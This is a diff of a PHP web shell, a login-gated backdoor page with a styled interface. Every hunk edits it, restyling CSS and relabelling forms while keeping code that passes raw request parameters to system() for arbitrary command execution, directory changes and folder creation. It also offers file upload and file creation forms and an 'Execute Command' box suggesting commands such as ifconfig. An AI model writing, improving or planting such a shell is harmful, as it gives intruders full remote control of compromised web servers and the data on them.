@@ -29,12 +29,9 @@ margin:0;
 color:#fff;
 /* Set font-family to monospace for better readability */
 font-family: monospace;
-/* Set a background color that will be displayed
-while the background image is loading */
-background:color:#232526;
-background: 
--webkit-linear-gradient(to right, #414345, #232526),  /* Chrome 10-25, Safari 5.1-6 */
-linear-gradient(to right, #414345, #232526); /* W3C, IE 10+/ Edge, Firefox 16+, Chrome 26+, Opera 12+, Safari 7+ */
+background: #232526;  /* fallback for old browsers */
+background: -webkit-linear-gradient(to bottom, #232526, #414345);  /* Chrome 10-25, Safari 5.1-6 */
+background: linear-gradient(to bottom, #232526, #414345); /* W3C, IE 10+/ Edge, Firefox 16+, Chrome 26+, Opera 12+, Safari 7+ */
 }
 
 p{
@@ -42,7 +39,7 @@ font-size:14px;
 line-height:24px;
 }
 table{
-background:rgba(0,0,0,0.9);
+/*background:rgba(0,0,0,0.9);*/
 }
 a{
 text-decoration:none;
@@ -530,7 +527,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 		?>
 		
 		<textarea cols="100%" rows="20" style="background:transparent;outline:none;color:#ffffff;">
-		<?=system($_GET['cmd'])?>
+<?php system($_GET['cmd']); ?>
 		</textarea></td>
 		</tr>
 		<?php
@@ -647,16 +644,16 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 				<table width="100%" style="font-size:14px;background:transparent;" border="0" cellpadding="20px">
 					<tr>
 						<td>
-							Upload : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" placeholder="Path Upload" name="path" value="<?php system("CHDIR");?>\"/><br /><br /><input type="file"  name="file" /> <input type="submit" name="submit" value="Send"/>
+							Upload : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" placeholder="Path Upload" name="path" value="<?php system("CHDIR");?>"/><br /><br /><input type="file"  name="file" /> <input type="submit" name="submit" value="Send"/>
 						</td>
 						<td>
 						<?php 
 						if(isset($_GET['file'])){
-						system("cd ".$_GET['file']);
+							system("cd ".$_GET['file']);
 						}
 						?>
 							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
-							Change Dir : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" name="file" value="<?php system("CHDIR");?>" /> <input type="submit" name="submit" style="padding:5px;margin-top:10px;width:50px;" value="Send"/>
+							Open Directory : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" name="file" value="<?php system("CHDIR");?>" /> <input type="submit" name="submit" style="padding:5px;margin-top:10px;width:50px;" value="Send"/>
 							</form>
 						</td>
 					</tr>
@@ -664,12 +661,12 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 						<td>
 							<?php 
 						if(isset($_POST['mkdir'])){
-						system("mkdir ".$_POST['mkdir']);
-						echo " Created ";
+							system("mkdir ".$cwd."/".$_POST['mkdir']);
+						echo "Created ";
 						}
 						?>
 							<form action="<?php $_SERVER['PHP_SELF'];?>" method="post">
-							Make Dir : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;"  name="mkdir" value="<?php system("CHDIR");?>\newFolder"/> <input type="submit" style="padding:5px;margin-top:10px;width:50px;" name="submit" value="Send"/>
+							Make Directory (<?=$cwd?>/) : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;"  name="mkdir" placeholder="Folder Name"/> <input type="submit" style="padding:5px;margin-top:10px;width:50px;" name="submit" value="Send"/>
 						    </form>
 						</td>
 						<td>
@@ -680,7 +677,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 						}
 						?>
 						<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
-							Make File : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" placeholder="file.format" name="newfile" value=""/> <input type="submit" name="submit" style="padding:5px;margin-top:10px;width:50px;" value="Send"/>
+							Make File : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" placeholder="eg: index.html" name="newfile" value=""/> <input type="submit" name="submit" style="padding:5px;margin-top:10px;width:50px;" value="Send"/>
 						</form>
 						</td>
 					</tr>
@@ -718,7 +715,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 						</td>
 						<td>
 							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
-							Execute : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" placeholder="Ex : dir,ls,ifconfig" name="cmd" value=""/> <input type="submit" style="padding:5px;margin-top:10px;width:50px;" name="submit" value="Send"/>
+							Execute Command : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" placeholder="Ex : dir,ls,ifconfig" name="cmd" value=""/> <input type="submit" style="padding:5px;margin-top:10px;width:50px;" name="submit" value="Send"/>
 							</form>
 						</td>
 					</tr>
